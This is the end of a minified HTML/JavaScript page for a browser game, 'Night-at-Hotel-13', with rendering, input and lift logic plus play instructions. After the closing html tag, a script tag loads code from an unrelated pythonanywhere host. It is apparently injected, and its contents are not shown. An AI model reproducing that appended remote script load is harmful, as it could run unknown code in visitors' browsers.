s=window.getComputedStyle(i);e={x:0,y:0,A:t,touches:{length:0},canvas:i,_cf:[],_lf:[],_o:[],_oo:null,_s:s},E.set(i,e)}i.addEventListener("mousedown",U),i.addEventListener("touchstart",U),i.addEventListener("mouseup",O),i.addEventListener("touchend",O),i.addEventListener("touchcancel",O),i.addEventListener("blur",N),i.addEventListener("mousemove",G),i.addEventListener("touchmove",G),e._t||(e._t=!0,f("tick",(()=>{e._lf.length=0,e._cf.map((t=>{e._lf.push(t)})),e._cf.length=0})))}();let S=[-1,0,1].map((t=>I({x:t*e.width,y:0,width:e.width,height:e.height,V:1.005,image:e,St:t}))),F=I({x:256,y:192,anchor:{x:.5,y:1},image:s.pi,D:2,fc:1,Ft:!1}),Y=[],k=I({x:10,y:240});for(let t of n.yt[A].ut){const i=I({x:224*t.dt+32,y:192,V:8,D:8,anchor:{x:0,y:1},image:s.d,Yt:t,kt:0});i.W(R({text:"",x:i.width/2+.5,y:-10,font:"3px Arial",color:"white",H:void 0,lineWidth:1,anchor:{x:.5,y:.5},textAlign:"center",onOver(){this.H="red"},onOut(){this.H=void 0},onDown(){"dr"==i.type&&ht(n.af.at(-i.Yt.dt))}})),i.W(R({text:"",x:-1,y:-10,font:"4px Arial",color:"white",anchor:{x:1,y:.5},textAlign:"right",onOver(){this.H="red"},onOut(){this.H=void 0},onDown(){ht(n.yt[A].fa)}})),i.W(I({x:i.width+2,y:-8})),D(i.children[0]),D(i.children[1]),D(i.children[2].children),Y.push(i)}let T=I({xx:384,x:384,y:192,anchor:{x:.5,y:1},image:s.pdi,V:2,D:2,fc:-1,next:3e3,Ut:0}),V=I({}),X=I({width:y,height:M});C.add(S,Y,F,T,V,X);const et=I({x:Q,y:99,width:99,height:40,color:"#555",anchor:{x:.5,y:.5},children:[R({text:"Next",x:0,y:0,font:"20px Arial",color:"white",anchor:{x:.5,y:.5}})],onDown(){wt++}}),st=I({width:y,height:99,color:"#000000",children:[R({text:"",x:18,y:18,font:"20px Arial",color:"white"}),et]});D(et);const ht=(t,e,s)=>{if(e||!k.children.find((i=>i.fa==t))){let h,n=R({text:e||t,x:0,y:0,xx:0,yy:0,font:"20px Arial",color:"white",lineWidth:8,anchor:{x:.5,y:0},textAlign:"center",fa:t,s:0,update(){this.x=i(this.x,this.xx,.2),this.y=i(this.y,this.yy,.2)},onOver(){this.H="#555"},onOut(){this.H=void 0},onDown(){e?(k.removeChild(n),r()):this.color=["white","red","yellow","lime","magenta"][++this.s%5]},children:[h=R({text:" ",x:-23,y:-2,font:"24px Arial",color:"#aaa",textAlign:"left",onOver(){this.text="+"},onOut(){this.text=" "},onDown(){ht(t,"?",k.children.indexOf(n))}})]});e||(s=k.children.findIndex((i=>i.fa>t))),k.children.splice(s<0?k.children.length:s,0,n),n.parent=k,n._pc=n._pc??(()=>{}),n._pc(),D(h),D(n);const r=t=>k.children.map(((i,e)=>{i.xx=e%13*36+18,i.yy=24*(e/13|0),i.fa==t&&(i.x=i.xx,i.y=-30)}));r(t),pt.play("coin")}},nt=()=>{Y.map((t=>{const i=n.wt[t.Yt.Mt?.Qt]?.gt||[];(function(...t){t.flat().map((t=>{let i=t.context?t.context.canvas:p(),e=E.get(i);if(!e)throw new ReferenceError("Pointer events not initialized for the objects canvas");t.G=t.__r,t.__r=0,o(e._o,t)}))})(t.children[2].children),t.children[2].children=i.map((t=>n.yt[t].fa)).reverse().map(((t,e)=>R({text:t,x:0,y:-i.length/2*3+3*e,font:"3px Arial",color:t==n.yt[A].fa?"#555":"white",H:void 0,lineWidth:1,anchor:{x:.5,y:.5},textAlign:"center",onOver(){this.H="red"},onOut(){this.H=void 0},onDown(){ht(t)}}))),D(t.children[2].children)}))},rt=()=>{Y.map((t=>{h(F,t)?t.kt=Math.min(500,t.kt+16):t.kt=Math.max(0,t.kt-16),t.Yt=n.yt[A].ut[t.Yt.dt],t.type=t.Yt.ft?"ex":t.Yt.Mt?"lf":t.Yt.vt?"sh":t.Yt.empty?"em":"dr",t.image={ex:s.ed2,lf:[s.ld1,s.ld2,s.ld3][Math.ceil(2*Math.min(1,t.kt/500))],em:s.d,dr:s.d}[t.type],t.children[0].y=t.Yt.ft?-16:-10,t.children[0].text={ex:"EXIT",dr:n.af.at(-t.Yt.dt)}[t.type]??"",t.children[1].text={lf:n.yt[A].fa+"/F"}[t.type]??""}))};rt(),nt();const at={},ot=t=>{const i=t.keyCode,e={87:"u",90:"u",38:"u",83:"d",40:"d",65:"l",81:"l",37:"l",68:"r",39:"r",32:"s",13:"en",9:"tb",16:"sh",77:"m"};if(e[i]){if(at[e[i]]=+(t.type[3]<"u"),at.u&&"u"==e[i]&&c<=Date.now()&&!a){for(let t of Y)t.Yt.Mt&&h(F,t)&&d(1,t.Yt),t.Yt.ft&&h(F,t)&&u();at.u=0}if(at.d&&"d"==e[i]&&c<=Date.now()&&!a){for(let t of Y)t.Yt.Mt&&h(F,t)&&d(-1,t.Yt);at.d=0}at.m&&"m"==e[i]&&(pt.volume=!pt.volume,at.m=0),at.sh&&"sh"==e[i]&&(F.Ft=!0,at.sh=0),t.preventDefault(),t.stopPropagation()}};window.addEventListener("keydown",ot),window.addEventListener("keyup",ot);let ct=function({fps:t=60,Ot:i=!0,update:e=r,G:s,context:h=x(),blur:n=!1}={}){if(!s)throw Error("You must provide a render() function");let A,a,o,c,l,u=0,d=1e3/t,w=1/t,p=i?W:r,m=!0;function y(){if(a=requestAnimationFrame(y),m&&(o=performance.now(),c=o-A,A=o,!(c>1e3))){for(u+=c;u>=d;)g("tick"),l.update(w),u-=d;p(l.context),l.G()}}return n||(window.addEventListener("focus",(()=>{m=!0})),window.addEventListener("blur",(()=>{m=!1}))),f("init",(()=>{l.context??=x()})),l={update:e,G:s,Gt:!0,context:h,start(){this.Gt&&(A=performance.now(),this.Gt=!1,requestAnimationFrame(y))},stop(){this.Gt=!0,cancelAnimationFrame(a)},_frame:y,set _last(t){A=t}},l}({update(){if(c>Date.now())return;v+=16,T.next<v&&(T.xx=F.x,T.next=v+2e3*Math.random()+1e3);const t=F.x-T.x,i=T.xx-T.x,n=Math.abs(t)/e.width*2;let r=i<-2?-1:i>2?1:0;if(T.fc=r||T.fc,T.x+=2*r,T.V=2*T.fc,T.image=r?Math.ceil(v/160)%2==0?s.Rt:s.Et:s.pdi,T.Ut<v){let t=V.children.find((t=>t.opacity<=0));t||(t=I({color:"#000000",update(){this.x+=this.dx,this.opacity-=this.Nt,this.y-=.5}}),V.W(t)),t.x=T.x+Math.random()*T.width-T.width/2,t.y=T.y+Math.random()*T.height*-2,t.A=3*Math.random()+1,t.Nt=.05*Math.random(),t.dx=Math.random()-.5,t.opacity=1,T.Ut+=50*Math.random()+20}if(wt>=dt.length&&n>.2&&Math.random()>n){let i=X.children.find((t=>t.opacity<=0));i||(i=I({color:"#000000",opacity:.7,update(){this.x+=this.dx,this.opacity-=this.Nt}}),X.W(i)),i.x=t>0?0:y,i.y=200*Math.random(),i.A=6*Math.random()+3,i.Nt=.08*Math.random(),i.dx=(Math.random()+1)*r,i.opacity=.7}X.update(),X.x=C.camera.x-Q,V.update(),wt<dt.length||(h(F,T)&&u(),r=at.l?-1:at.r?1:0,r?Math.ceil(v/160)%2==0&&pt.play("step"):F.Ft=!1,F.x+=r*(F.Ft?12.8:6.4),F.fc=r||F.fc,F.image=r?Math.ceil(v/160)%2==0?s.pr1:s.pr2:s.pi,rt(),k.update())},G(){B.globalAlpha=1,B.fillStyle="#000000",B.fillRect(0,0,y,M),F.V=3==t?0:2*F.fc,C.camera.x=F.x;const i=Math.round((F.x+e.width/2)/e.width)-1;for(let t of S)t.x=(3*Math.floor((i+1-t.St)/3)+t.St)*e.width;for(let t of[...Y,T]){for(;t.x-F.x>e.width/2;)t.x-=e.width;for(;t.x-F.x<-e.width/2;)t.x+=e.width}if(C.G(),k.G(),wt<dt.length&&(st.children[0].text=dt[wt],st.G(),T.next=v+3e3),c>Date.now()||5==t)switch(t){case 1:case 2:const i=e.height+e.height+1e3,h=(1-(c-Date.now())/2e3)*(i+e.height);B.fillStyle="#000000",B.fillRect(0,1==t?-h+e.height:h-i,y,i),B.fillStyle="white",B.font="18px Arial",B.textAlign="center",B.fillText("Riding lift...",Q,160);break;case 3:B.fillStyle="#000000";const n=Math.pow(1-(c-Date.now())/ft,2)*y*2,r=4*(1-Math.pow(1-(c-Date.now())/ft,2));B.beginPath(),B.arc(Q,160,n,0,2*Math.PI),B.fill(),B.drawImage(s.pf,Q-16*r/2,180-12.8*r,16*r,16*r),c-Date.now()<2e3&&(B.fillStyle="white",B.font="32px Arial",B.textAlign="center",B.fillText("No escape!",Q,120),B.font="18px Arial",B.fillText("The true 13/F was marked "+l+"/F",Q,200),B.fillText("Randomizing the hotel...",Q,218));break;case 4:B.fillStyle="#000000",B.globalAlpha=1-Math.pow(1-(c-Date.now())/4e3,2),B.fillRect(0,0,y,M),c-Date.now()&&(B.globalAlpha=1,B.fillStyle="white",B.font="18px Arial",B.textAlign="center",B.fillText("Exit from the true 13/F",Q,160));break;case 5:B.fillStyle="white",B.globalAlpha=Math.pow(2*(1-(c-Date.now())/7e3),2),B.fillRect(0,0,y,M),c-Date.now()<1e3&&(B.fillStyle="#000000",B.font="32px Arial",B.textAlign="center",B.fillText("You win!",Q,120),B.font="18px Arial",B.fillText("You win after "+gt+" fail attempts",Q,200),B.fillText("Refresh the page to play again",Q,218))}}});ct.start();const lt=()=>{ct.stop(),window.removeEventListener("keydown",ot),window.removeEventListener("keyup",ot),b.removeEventListener("pointerenter",w),xt(4)}},mt=(t,i)=>{const e=t.getContext("2d");t.width=7*i.yt[0].ut.length*32,t.height=224;const s=e.createLinearGradient(0,0,0,t.height);s.addColorStop(0,"#9babf2"),s.addColorStop(1,"#34418c"),e.fillStyle=s,e.fillRect(0,0,t.width,t.height),e.fillStyle="rgb(143, 41, 41)",e.fillRect(0,0,t.width,32),e.fillRect(0,192,t.width,32),e.fillStyle="rgb(132, 119, 110)",e.fillRect(0,182,t.width,10)};window.onload=xt})()})()</script><style type="text/css">body,html{font-family:sans-serif;height:100%;margin:0;padding:0;width:100%}body{background:#fff}.container{box-sizing:content-box;margin:0 auto 64px;padding:1em;width:480px}#a{background:#f5f5f5;height:320px;image-rendering:pixelated;width:480px}</style></head><body><div class="container"><canvas id="a" width="480" height="320"></canvas><h3>Night-at-Hotel-13</h3><p>By Dickson Chui (vicksonzero)<br>- Use WASD, ZQSD, or Arrow keys to move.<br>- Press Up or Down to take lift.<br>- Click numbers to take notes.<br>- Click between notes to insert blanks.<br></p><p><a href="https://github.com/vicksonzero/night-at-hotel-13">Source code here</a> | <a href="https://vicksonzero.itch.io/night-at-hotel-13">Comment here</a></p></div></body></html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>